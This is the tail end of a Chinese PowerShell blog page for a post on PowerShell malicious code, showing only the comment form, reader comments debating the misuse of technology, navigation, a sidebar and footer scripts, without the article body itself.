id='os-popup-content'></div></div><div id=postcopy><strong>本文链接：</strong> <a rel=”bookmark” href="https://www.pstips.net/the-variety-of-powershell-malice-code.html">https://www.pstips.net/the-variety-of-powershell-malice-code.html</a><br/><strong><I>请尊重原作者和编辑的辛勤劳动,欢迎转载,并注明出处!</I></strong></div><div class='yarpp-related yarpp-related-none'>
+<p>暂时没有相关文章。</p>
+</div>
+                                      </section><!-- .entry-content -->
+                                            </article>
+                                
+                            
+                        
+                    <hr class="featurette-divider __after_loop">
+<div id="comments" class="comments-area" >
+		<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/the-variety-of-powershell-malice-code.html#respond" style="display:none;">取消回复</a></small></h3><form action="https://www.pstips.net/wp-comments-post.php" method="post" id="commentform" class="comment-form"><div class='os-login-box'><i onclick="login_button_click('qq','https://www.pstips.net/index.php','login','')" title="使用 QQ 登录" class="os-icon os-login-qq"><svg aria-hidden="true"><use xlink:href="#os-login-qq"></use></svg></i><i onclick="login_button_click('sina','https://www.pstips.net/index.php','login','')" title="使用 微博 登录" class="os-icon os-login-sina"><svg aria-hidden="true"><use xlink:href="#os-login-sina"></use></svg></i><i onclick="login_button_click('baidu','https://www.pstips.net/index.php','login','')" title="使用 百度 登录" class="os-icon os-login-baidu"><svg aria-hidden="true"><use xlink:href="#os-login-baidu"></use></svg></i><i onclick="login_button_click('github','https://www.pstips.net/index.php','login','')" title="使用 Github 登录" class="os-icon os-login-github"><svg aria-hidden="true"><use xlink:href="#os-login-github"></use></svg></i></div><p class="comment-notes"><span id="email-notes">电子邮件地址不会被公开。</span> 必填项已用<span class="required">*</span>标注</p><p class="comment-form-comment"><label for="comment">评论</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">姓名 <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" required='required' /></p>
+<p class="comment-form-email"><label for="email">电子邮件 <span class="required">*</span></label> <input id="email" name="email" type="text" value="" size="30" maxlength="100" aria-describedby="email-notes" required='required' /></p>
+<p class="comment-form-url"><label for="url">站点</label> <input id="url" name="url" type="text" value="" size="30" maxlength="200" /></p>
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="发表评论" /> <input type='hidden' name='comment_post_ID' value='6239' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="85390200ba" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="205"/></p></form>	</div><!-- #respond -->
+	<h2 id="tc-comment-title" class="comments-title">7 条评论 &ldquo;<span>Powershell恶意代码的N种姿势</span>&rdquo;</h2>              <ul class="commentlist">
+                        <li class="comment byuser comment-author-mosser even thread-even depth-1" id="li-comment-17517">
+
+            <article id="comment-17517" class="comment"><div class="row-fluid"><div class="comment-avatar span2"><img alt='' src='//thirdqq.qlogo.cn/g?b=oidb&#038;k=TF3a1fT5A32KFcYGFVLu3Q&#038;s=100&#038;t=1555746093' srcset='//thirdqq.qlogo.cn/g?b=oidb&#038;k=TF3a1fT5A32KFcYGFVLu3Q&#038;s=100&#038;t=1555746093 2x' class='avatar avatar-80 photo' height='80' width='80' /></div><div class="span10"><div class="reply btn btn-small"><a rel='nofollow' class='comment-reply-link' href='https://www.pstips.net/the-variety-of-powershell-malice-code.html?replytocom=17517#respond' data-commentid="17517" data-postid="6239" data-belowelement="comment-17517" data-respondelement="respond" aria-label='回复给Mooser Lee'>回复 <span>&darr;</span></a></div> <header class="comment-meta comment-author vcard"><cite class="fn"><a href='http://www.pstips.net' rel='external nofollow ugc' class='url'>Mooser Lee</a>  </cite> <a class="comment-date" href="https://www.pstips.net/the-variety-of-powershell-malice-code.html#comment-17517"><time datetime="2017-02-14T22:37:16+08:00">2017年2月14日 于 下午 10:37</time></a></header>  <section class="comment-content comment"><p>大开眼界啊</p>
+</section></div></div></article>          <!-- //#comment-## -->
+        <ul class="children">
+        <li class="comment byuser comment-author-jailman bypostauthor odd alt depth-2" id="li-comment-17520">
+
+            <article id="comment-17520" class="comment"><div class="row-fluid"><div class="comment-avatar span2"><img alt='' src='https://secure.gravatar.com/avatar/675ca62c5c86fca0c8844e4afd3d353b?s=80&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/675ca62c5c86fca0c8844e4afd3d353b?s=160&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-80 photo' height='80' width='80' /></div><div class="span10"><div class="reply btn btn-small"><a rel='nofollow' class='comment-reply-link' href='https://www.pstips.net/the-variety-of-powershell-malice-code.html?replytocom=17520#respond' data-commentid="17520" data-postid="6239" data-belowelement="comment-17520" data-respondelement="respond" aria-label='回复给jailman'>回复 <span>&darr;</span></a></div> <header class="comment-meta comment-author vcard"><cite class="fn">jailman <span> 文章作者</span> </cite> <a class="comment-date" href="https://www.pstips.net/the-variety-of-powershell-malice-code.html#comment-17520"><time datetime="2017-02-15T09:49:24+08:00">2017年2月15日 于 上午 9:49</time></a></header>  <section class="comment-content comment"><p>新生事物管制不严，很容易沦为黑客帮凶。</p>
+</section></div></div></article>          <!-- //#comment-## -->
+        </li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+        <li class="comment even thread-odd thread-alt depth-1" id="li-comment-17531">
+
+            <article id="comment-17531" class="comment"><div class="row-fluid"><div class="comment-avatar span2"><img alt='' src='https://secure.gravatar.com/avatar/d09e53ff469433c5a871a59610a3f7db?s=80&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/d09e53ff469433c5a871a59610a3f7db?s=160&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-80 photo' height='80' width='80' /></div><div class="span10"><div class="reply btn btn-small"><a rel='nofollow' class='comment-reply-link' href='https://www.pstips.net/the-variety-of-powershell-malice-code.html?replytocom=17531#respond' data-commentid="17531" data-postid="6239" data-belowelement="comment-17531" data-respondelement="respond" aria-label='回复给ps传教士'>回复 <span>&darr;</span></a></div> <header class="comment-meta comment-author vcard"><cite class="fn">ps传教士  </cite> <a class="comment-date" href="https://www.pstips.net/the-variety-of-powershell-malice-code.html#comment-17531"><time datetime="2017-02-23T16:50:29+08:00">2017年2月23日 于 下午 4:50</time></a></header>  <section class="comment-content comment"><p>所有皇叔前面都会写上，我这不是传黄，是给人教训。此贴也一样是ps脚本黑客的教学案例。<br />
+技术中性，但是国人心都是坏的。用技术作恶，是坏心眼人的最爱。<br />
+你给他一个原子弹，看他拿来干嘛，即可知此人性。可惜用来损人利己的“臭虫”巨也！为善者寥寥无几也。<br />
+呜呼，ps这片地要脏也。</p>
+</section></div></div></article>          <!-- //#comment-## -->
+        <ul class="children">
+        <li class="comment byuser comment-author-jailman bypostauthor odd alt depth-2" id="li-comment-17532">
+
+            <article id="comment-17532" class="comment"><div class="row-fluid"><div class="comment-avatar span2"><img alt='' src='https://secure.gravatar.com/avatar/675ca62c5c86fca0c8844e4afd3d353b?s=80&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/675ca62c5c86fca0c8844e4afd3d353b?s=160&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-80 photo' height='80' width='80' /></div><div class="span10"><div class="reply btn btn-small"><a rel='nofollow' class='comment-reply-link' href='https://www.pstips.net/the-variety-of-powershell-malice-code.html?replytocom=17532#respond' data-commentid="17532" data-postid="6239" data-belowelement="comment-17532" data-respondelement="respond" aria-label='回复给jailman'>回复 <span>&darr;</span></a></div> <header class="comment-meta comment-author vcard"><cite class="fn">jailman <span> 文章作者</span> </cite> <a class="comment-date" href="https://www.pstips.net/the-variety-of-powershell-malice-code.html#comment-17532"><time datetime="2017-02-23T17:05:21+08:00">2017年2月23日 于 下午 5:05</time></a></header>  <section class="comment-content comment"><p>混过安全圈的人估计都有一种感触，那就是正不压邪，道高一尺魔高一丈！鬼谷子不是一直抱有“人之初性本恶”的理念吗。善恶本是相对的，何必纠结，顺其自然就好，再说了，你不happy，你可以挣扎么。</p>
+</section></div></div></article>          <!-- //#comment-## -->
+        </li><!-- #comment-## -->
+        <li class="comment byuser comment-author-jailman bypostauthor even depth-2" id="li-comment-17533">
+
+            <article id="comment-17533" class="comment"><div class="row-fluid"><div class="comment-avatar span2"><img alt='' src='https://secure.gravatar.com/avatar/675ca62c5c86fca0c8844e4afd3d353b?s=80&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/675ca62c5c86fca0c8844e4afd3d353b?s=160&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-80 photo' height='80' width='80' /></div><div class="span10"><div class="reply btn btn-small"><a rel='nofollow' class='comment-reply-link' href='https://www.pstips.net/the-variety-of-powershell-malice-code.html?replytocom=17533#respond' data-commentid="17533" data-postid="6239" data-belowelement="comment-17533" data-respondelement="respond" aria-label='回复给jailman'>回复 <span>&darr;</span></a></div> <header class="comment-meta comment-author vcard"><cite class="fn">jailman <span> 文章作者</span> </cite> <a class="comment-date" href="https://www.pstips.net/the-variety-of-powershell-malice-code.html#comment-17533"><time datetime="2017-02-23T17:09:58+08:00">2017年2月23日 于 下午 5:09</time></a></header>  <section class="comment-content comment"><p>对了，还有，ps这片地其实已经“脏”了，也不叫“脏”，应该是“成熟”了。</p>
+</section></div></div></article>          <!-- //#comment-## -->
+        </li><!-- #comment-## -->
+</ul><!-- .children -->
+</li><!-- #comment-## -->
+        <li class="comment odd alt thread-even depth-1" id="li-comment-17534">
+
+            <article id="comment-17534" class="comment"><div class="row-fluid"><div class="comment-avatar span2"><img alt='' src='https://secure.gravatar.com/avatar/d09e53ff469433c5a871a59610a3f7db?s=80&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/d09e53ff469433c5a871a59610a3f7db?s=160&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-80 photo' height='80' width='80' /></div><div class="span10"><div class="reply btn btn-small"><a rel='nofollow' class='comment-reply-link' href='https://www.pstips.net/the-variety-of-powershell-malice-code.html?replytocom=17534#respond' data-commentid="17534" data-postid="6239" data-belowelement="comment-17534" data-respondelement="respond" aria-label='回复给ps传教士'>回复 <span>&darr;</span></a></div> <header class="comment-meta comment-author vcard"><cite class="fn">ps传教士  </cite> <a class="comment-date" href="https://www.pstips.net/the-variety-of-powershell-malice-code.html#comment-17534"><time datetime="2017-02-24T13:02:36+08:00">2017年2月24日 于 下午 1:02</time></a></header>  <section class="comment-content comment"><p>【马肥传毒士】高叫道，我们是传播麻醉术的天使！我们用自己圣洁的身体传播大爱。（用身体传毒）<br />
+马肥只是人性的照妖镜。照妖镜没错，应该大大滴抛出，要说有错也是妖精太多。妖精多少跟我们毫无关系。我们也有祖师爷是华佗！多数国家及世人对我们存有偏见，我们应该被正名。</p>
+</section></div></div></article>          <!-- //#comment-## -->
+        </li><!-- #comment-## -->
+        <li class="comment even thread-odd thread-alt depth-1" id="li-comment-17535">
+
+            <article id="comment-17535" class="comment"><div class="row-fluid"><div class="comment-avatar span2"><img alt='' src='https://secure.gravatar.com/avatar/d09e53ff469433c5a871a59610a3f7db?s=80&#038;d=monsterid&#038;r=g' srcset='https://secure.gravatar.com/avatar/d09e53ff469433c5a871a59610a3f7db?s=160&#038;d=monsterid&#038;r=g 2x' class='avatar avatar-80 photo' height='80' width='80' /></div><div class="span10"><div class="reply btn btn-small"><a rel='nofollow' class='comment-reply-link' href='https://www.pstips.net/the-variety-of-powershell-malice-code.html?replytocom=17535#respond' data-commentid="17535" data-postid="6239" data-belowelement="comment-17535" data-respondelement="respond" aria-label='回复给ps传教士'>回复 <span>&darr;</span></a></div> <header class="comment-meta comment-author vcard"><cite class="fn">ps传教士  </cite> <a class="comment-date" href="https://www.pstips.net/the-variety-of-powershell-malice-code.html#comment-17535"><time datetime="2017-02-24T13:05:08+08:00">2017年2月24日 于 下午 1:05</time></a></header>  <section class="comment-content comment"><p>【马@肥传d@毒士】高叫道，我们是传播麻醉术的天使！我们用自己圣洁的身体传播大爱。（用身体传d@毒）<br />
+马@肥只是人性的照妖镜。照妖镜没错，应该大大滴抛出，要说有错也是妖精太多。妖精多少跟我们毫无关系。我们也有祖师爷是华佗！多数国家及世人对我们存有偏见，我们应该被正名</p>
+</section></div></div></article>          <!-- //#comment-## -->
+        </li><!-- #comment-## -->
+              </ul><!-- .commentlist -->
+            </div><!-- //#comments .comments-area -->
+
+        
+          <hr class="featurette-divider __after_loop">
+        <nav id="nav-below" class="navigation">
+
+              <h3 class="assistive-text">
+                文章导航              </h3>
+
+              <ul class="pager">
+                                  <li class="previous">
+                    <span class="nav-previous">
+                      <a href="https://www.pstips.net/valuable-powershell-tools.html" rel="prev"><span class="meta-nav">&larr;</span> 一些值得收藏的PowerShell工具</a>                    </span>
+                  </li>
+                                                  <li class="next">
+                    <span class="nav-next">
+                        <a href="https://www.pstips.net/word-to-pdf-with-office.html" rel="next">PowerShell借助Office把Word文档转换成PDF <span class="meta-nav">&rarr;</span></a>                    </span>
+                  </li>
+                              </ul>
+
+          </nav><!-- //#nav-below .navigation -->
+
+        
+        
+                                   <hr class="featurette-divider tc-mobile-separator">
+                </div><!--.article-container -->
+
+           
+        <div class="span3 right tc-sidebar">
+           <div id="right" class="widget-area" role="complementary">
+              <aside id="search-3" class="widget widget_search"><h3 class="widget-title">  站内搜索</h3><form role="search" method="get" id="searchform" class="searchform" action="https://www.pstips.net/">
+				<div>
+					<label class="screen-reader-text" for="s">搜索：</label>
+					<input type="text" value="" name="s" id="s" />
+					<input type="submit" id="searchsubmit" value="搜索" />
+				</div>
+			</form></aside><aside id="dwqa-latest-question-2" class="widget dwqa-widget dwqa-latest-questions"><h3 class="widget-title">网友求助</h3><div class="dwqa-popular-questions"><ul><li><a href="https://www.pstips.net/question/18413.html" class="question-title">如何更改文件的默认打开方式通过脚本的形式</a> 提问人 Qetesh, 2月 ago.</li><li><a href="https://www.pstips.net/question/18388.html" class="question-title">使用system.net.client上传文件时如何获取上传是否成功？</a> 提问人 pwshroad, 3月 ago.</li><li><a href="https://www.pstips.net/question/18378.html" class="question-title">有一个实施中的项目需求</a> 提问人 万恒, 3月 ago.</li><li><a href="https://www.pstips.net/question/18369.html" class="question-title">请问如何使用powershell 在outlook中把某个用户的邮箱的邮件导出成.pst 文件</a> 提问人 seahillpass, 3月 ago.</li><li><a href="https://www.pstips.net/question/18342.html" class="question-title">powershell 如何将字符串编码为GBK</a> 提问人 awang, 3月 ago.</li><li><a href="https://www.pstips.net/question/18339.html" class="question-title">怎么安装并使用selenium？</a> 提问人 liusheng, 3月 ago.</li><li><a href="https://www.pstips.net/question/18327.html" class="question-title">输入用户名、密码后，点击登录无效？</a> 提问人 liusheng, 4月 ago.</li><li><a href="https://www.pstips.net/question/18321.html" class="question-title">如何获取多台远程服务器上的文件内容，并汇总到本地？</a> 提问人 pwshroad, 4月 ago.</li><li><a href="https://www.pstips.net/question/18297.html" class="question-title">怎样用powershell提取Windows自带应用的安装包</a> 提问人 a0195, 4月 ago.</li><li><a href="https://www.pstips.net/question/18306.html" class="question-title">如何使用HttpListener构建多线程HTTP轻量级API服务器</a> 提问人 Q1499821613, 4月 ago.</li></ul></div></aside>            </div><!-- //#left or //#right -->
+        </div><!--.tc-sidebar -->
+
+        
+        </div><!--.row -->
+    </div><!-- .container role: main -->
+
+    
+</div><!-- //#main-wrapper -->
+
+  		<!-- FOOTER -->
+  		<footer id="footer" class="">
+  		 					<div class="container footer-widgets ">
+                    <div class="row widget-area" role="complementary">
+												
+							<div id="footer_one" class="span4">
+																															</div><!-- .{$key}_widget_class -->
+
+						
+							<div id="footer_two" class="span4">
+																
+										<aside id="text-6" class="widget widget_text">			<div class="textwidget"><script type="text/javascript" src="//ra.revolvermaps.com/0/0/6.js?i=0t2g9mmsadn&amp;m=1&amp;s=255&amp;c=ff0000&amp;cr1=ffffff&amp;f=georgia&amp;l=0&amp;lx=-420&amp;ly=180" async="async"></script></div>
+		</aside>
+																							</div><!-- .{$key}_widget_class -->
+
+						
+							<div id="footer_three" class="span4">
+																
+										
+																							</div><!-- .{$key}_widget_class -->
+
+																	</div><!-- .row.widget-area -->
+				</div><!--.footer-widgets -->
+				    				 <div class="colophon">
+			 	<div class="container">
+			 		<div class="row-fluid">
+					    <div class="span3 social-block pull-left"></div>
+<div class="span4 credits">
+ <p> &middot; &copy; 2020 <a href="https://www.pstips.net" title="PowerShell 中文博客" rel="bookmark">PowerShell 中文博客</a> &middot; <a href="http://www.beian.miit.gov.cn/">[沪ICP备14006567号]</a> &middot;</p>        </div>	      			</div><!-- .row-fluid -->
+	      		</div><!-- .container -->
+	      	</div><!-- .colophon -->
+	    	  		</footer>
+    </div><!-- //#tc-page-wrapper -->
+		<link rel='stylesheet' id='yarppRelatedCss-css'  href='https://www.pstips.net/wp-content/plugins/yet-another-related-posts-plugin/style/related.css?ver=5.3.4' type='text/css' media='all' />
+<script type='text/javascript'>
+/* <![CDATA[ */
+var viewsCacheL10n = {"admin_ajax_url":"https:\/\/www.pstips.net\/wp-admin\/admin-ajax.php","post_id":"6239"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/plugins/wp-postviews/postviews-cache.js?ver=1.68'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var zerospam = {"key":"(#Iekqc1dgvgoo$UtK4Y4ToMYSAZbFzd6#viQikWCfeDC&@daVn7VW3w7uHnpM#5"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/plugins/zero-spam/js/zerospam.js?ver=3.1.1'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-includes/js/comment-reply.min.js?ver=5.3.4'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/themes/customizr/assets/front/js/libs/modernizr.min.js?ver=4.2.4'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-includes/js/jquery/ui/effect.min.js?ver=1.11.4'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/themes/customizr/assets/front/js/libs/retina.min.js?ver=4.2.4'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/plugins/open-social/res/iconfont.js?ver=5.3.4'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/plugins/open-social/res/main.js?ver=5.3.4'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-includes/js/wp-embed.min.js?ver=5.3.4'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/plugins/easy-table-of-contents/vendor/smooth-scroll/jquery.smooth-scroll.min.js?ver=2.2.0'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/plugins/easy-table-of-contents/vendor/js-cookie/js.cookie.min.js?ver=2.2.1'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/plugins/easy-table-of-contents/vendor/sticky-kit/jquery.sticky-kit.min.js?ver=1.9.2'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var ezTOC = {"smooth_scroll":"1","visibility_hide_by_default":"","width":"auto","scroll_offset":"30"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/plugins/easy-table-of-contents/assets/js/front.min.js?ver=2.0.11-1588819693'></script>
+<script async="async" type='text/javascript' src='https://www.pstips.net/wp-content/plugins/akismet/_inc/form.js?ver=4.1.6'></script>
+<div id="tc-footer-btt-wrapper" class="tc-btt-wrapper right"><i class="btt-arrow"></i></div>	</body>
+	</html>
+<!-- Dynamic page generated in 0.243 seconds. -->
+<!-- Cached page generated by WP-Super-Cache on 2020-08-14 21:34:53 -->
+
+<!-- super cache -->
